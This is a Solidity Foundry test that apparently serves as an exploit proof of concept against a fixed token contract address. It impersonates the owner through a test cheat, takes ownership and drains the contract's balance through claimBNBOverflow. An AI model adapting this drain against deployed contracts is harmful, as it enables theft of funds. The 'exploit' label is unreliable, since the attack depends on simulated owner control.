// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBGLToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function claimBNBOverflow(uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x225d0236Ce8C9d753dFAe9CD0265dA2d2699Ba4F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        IBGLToken bglToken = IBGLToken(TARGET);
        address originalOwner = bglToken.owner();

        vm.startPrank(originalOwner);
        bglToken.transferOwnership(attacker);
        vm.stopPrank();

        uint256 amountToDrain = address(TARGET).balance;

        // The check is `amount < address(this).balance`.
        // We must leave at least 1 wei to pass the check.
        bglToken.claimBNBOverflow(amountToDrain - 1);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

